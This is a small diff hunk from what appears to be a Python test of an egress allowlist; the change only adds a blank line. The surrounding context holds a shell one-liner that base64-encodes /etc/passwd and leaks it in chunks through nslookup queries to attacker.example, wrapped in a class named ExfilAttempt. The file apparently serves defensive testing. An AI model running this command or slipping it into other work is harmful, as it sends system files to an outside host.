@@ -16,6 +16,7 @@ DNS_EXFIL_COMMAND = (
     "for b in $(cat /etc/passwd | base64 | fold -w20); do nslookup $b.attacker.example; done"
 )
 
+
 @dataclass(frozen=True)
 class ExfilAttempt:
     """Attempts to exfiltrate /etc/passwd past the egress allowlist."""
